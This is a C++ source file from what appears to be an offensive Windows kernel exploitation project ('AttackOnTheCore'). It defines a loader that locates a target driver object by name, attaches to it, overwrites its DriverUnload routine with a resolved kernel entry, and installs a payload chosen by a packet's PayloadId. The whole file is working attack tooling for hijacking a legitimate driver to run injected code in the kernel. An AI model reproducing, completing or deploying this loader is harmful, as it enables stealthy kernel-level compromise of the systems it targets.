#include <Common/drv_common.h>
#include <Common/internals/DummyDriveObject.hpp>
#include <Common/kernel/Ppc.hpp>
#include <Common/utils/Attach2Device.hpp>

#include <loader/src/DynamicClass.h>
#include <loader/src/kernel/Resolver.cpp>
#include <loader/src/kernel/KernelModule.hpp>

#include <Common/exploitation/extinterface.h>
#include <AttackOnTheCore/src/DriverMain.hpp>

class CLdrPpc :
	public CPpc,
	public IExitCallback
{
	CDummyDevice m_dummyDevice;
	std::unique_ptr<extinterface::PACKET> m_packet;

	CDriver m_driver;

public:
	CLdrPpc(
		__in DRIVER_OBJECT* drvOb,
		__in const extinterface::PACKET& packet
		) : CPpc(drvOb->DeviceObject),
			m_dummyDevice(drvOb),
			m_packet(new extinterface::PACKET(packet))
	{
	}
protected:
	void
	CustomPpc(
		__in DEVICE_OBJECT* devObj
		) override
	{
		m_dummyDevice.get()->DriverUnload = reinterpret_cast<DRIVER_UNLOAD*>(Resolver::ExitKernelEntry);
		CKernelModule::GetInstance().SetParams(m_dummyDevice.get(), m_packet.get());
		CKernelModule::GetInstance().RegisterRuntimeClass(*this);
		
		m_driver.Install(m_packet->PayloadId);
	}
};

extern "C"
__declspec(dllexport)
void
SystemLoader(
	__in_z const WCHAR* drvName,
	__in const extinterface::PACKET& packet
	)
{
	if (!Resolver::ResolveKernelEntry())
		return;

	DRIVER_OBJECT* drv_obj = CAttach2Device<nullptr_t>::GetTargetDriverObjetct(drvName);
	if (!drv_obj)
		return;

	if (!drv_obj->DeviceObject)
		return;

	//will be registered in CustomPpc, and destroyed in do_exit
	auto sys_worker = new CLdrPpc(drv_obj, packet);

	if (sys_worker)
		sys_worker->Run();
}
